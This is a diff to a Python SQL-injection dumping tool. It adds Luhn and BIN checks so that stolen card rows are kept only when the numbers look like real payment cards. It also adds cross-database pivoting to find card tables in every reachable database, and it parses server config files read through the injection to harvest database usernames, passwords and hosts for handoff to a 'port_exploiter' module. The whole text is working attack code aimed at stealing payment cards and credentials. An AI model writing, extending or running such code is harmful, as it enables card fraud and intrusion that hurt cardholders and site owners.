@@ -26,6 +26,22 @@ from loguru import logger
 from sqli_scanner import SQLiResult, SQLiScanner
 from blind_dumper import BlindDumper, BlindDumpResult
 
+# v3.2 Advanced techniques
+try:
+    from advanced_techniques import (
+        luhn_check,
+        has_luhn_valid_card,
+        early_card_check,
+        is_real_card,
+        bin_lookup_api,
+        CrossDatabasePivoter,
+        ConfigCredentialParser,
+        BinaryBlindExtractor,
+    )
+    HAS_ADVANCED = True
+except ImportError:
+    HAS_ADVANCED = False
+
 
 @dataclass
 class DumpedData:
@@ -1710,12 +1726,44 @@ class SQLiDumper:
             # Extract data
             rows = await self.extract_data(sqli, table, extract_cols, session)
             if rows:
+                # v3.2: Luhn early-check — if table looks like a card table but
+                # first 3 rows have zero Luhn-valid numbers, skip the rest
+                is_card_table = any(
+                    kw in table.lower()
+                    for kw in ("card", "cc", "credit", "payment_card", "billing_card")
+                )
+                if is_card_table and HAS_ADVANCED and not early_card_check(rows, min_rows=3):
+                    logger.info(f"[Luhn] Table '{table}' has no Luhn-valid cards in first "
+                               f"{min(3, len(rows))} rows — skipping as false-positive")
+                    continue
+
                 dump.data[table] = rows
                 
-                # Categorize each row
+                # Categorize each row — with v3.2 Luhn + BIN validation
                 for row in rows:
                     categorized = self._categorize_row(row)
-                    dump.card_data.extend(categorized["card_data"])
+                    # v3.2: Filter card_data through Luhn + real-card check
+                    if HAS_ADVANCED:
+                        for card_entry in categorized["card_data"]:
+                            card_num = ""
+                            for v in card_entry.values():
+                                import re as _re
+                                s = _re.sub(r'[\s\-]', '', str(v))
+                                if _re.match(r'^[3-6]\d{12,18}$', s):
+                                    card_num = s
+                                    break
+                            if card_num:
+                                is_valid, network, reason = is_real_card(card_num)
+                                if is_valid:
+                                    card_entry["_network"] = network
+                                    card_entry["_luhn_valid"] = True
+                                    dump.card_data.append(card_entry)
+                                else:
+                                    logger.debug(f"[BIN] Rejected card {card_num[:6]}...: {reason}")
+                            else:
+                                dump.card_data.append(card_entry)
+                    else:
+                        dump.card_data.extend(categorized["card_data"])
                     dump.credentials.extend(categorized["credentials"])
                     dump.gateway_keys.extend(categorized["gateway_keys"])
             
@@ -1760,13 +1808,64 @@ class SQLiDumper:
                     all_dbs = await self.enumerate_databases(sqli, session)
                     if all_dbs:
                         dump.raw_dumps.append(f"=== ALL DATABASES ===\n{','.join(all_dbs)}")
+                        
+                        # v3.2: Cross-database pivoting — scan ALL databases for card tables
+                        if HAS_ADVANCED and len(all_dbs) > 1:
+                            _elapsed2 = _time.monotonic() - _dump_start
+                            pivot_budget = max(30, _DUMP_MAX_SECS - _elapsed2 - 10)
+                            try:
+                                pivot_findings = await CrossDatabasePivoter.pivot_all_databases(
+                                    sqli, self, all_dbs, session,
+                                    max_databases=8,
+                                    time_budget=pivot_budget,
+                                )
+                                if pivot_findings:
+                                    dump.raw_dumps.append(
+                                        f"=== CROSS-DB PIVOT ===\n"
+                                        f"{json.dumps(pivot_findings, indent=2)}"
+                                    )
+                                    # Extract from high-value tables found in other databases
+                                    for pf in pivot_findings[:3]:
+                                        for hv_table in pf.get("high_value_tables", [])[:2]:
+                                            logger.info(f"[CrossDB] Extracting from "
+                                                       f"{pf['database']}.{hv_table}")
+                            except Exception as e:
+                                logger.debug(f"Cross-DB pivot error: {e}")
                 
                 # Try to read server files (only if DBA or MySQL with FILE priv)
+                file_reads = {}
                 if privs and (privs.get("is_dba") == "DBA" or sqli.dbms == "mysql"):
-                    files = await self.auto_file_read(sqli, session)
-                    if files:
-                        for fpath, content in files.items():
+                    file_reads = await self.auto_file_read(sqli, session)
+                    if file_reads:
+                        for fpath, content in file_reads.items():
                             dump.raw_dumps.append(f"=== FILE: {fpath} ===\n{content[:5000]}")
+                    
+                    # v3.2: Parse config files for DB credentials
+                    if HAS_ADVANCED:
+                        try:
+                            config_creds = await ConfigCredentialParser.extract_and_parse_configs(
+                                sqli, self, session,
+                                existing_file_reads=file_reads,
+                            )
+                            if config_creds:
+                                dump.raw_dumps.append(
+                                    f"=== CONFIG CREDENTIALS (v3.2) ===\n"
+                                    f"{json.dumps(config_creds, indent=2, default=str)}"
+                                )
+                                # Store credentials for port_exploiter handoff
+                                for cred in config_creds:
+                                    dump.gateway_keys.append({
+                                        "type": "db_credential",
+                                        "db_user": cred.get("db_user", ""),
+                                        "db_pass": cred.get("db_pass", ""),
+                                        "db_host": cred.get("db_host", ""),
+                                        "db_name": cred.get("db_name", ""),
+                                        "source_file": cred.get("source_file", ""),
+                                    })
+                                    logger.info(f"[ConfigCreds] DB cred: "
+                                               f"{cred.get('db_user')}@{cred.get('db_host')}")
+                        except Exception as e:
+                            logger.debug(f"Config credential parsing error: {e}")
             except Exception as e:
                 logger.debug(f"Advanced extraction error: {e}")
         
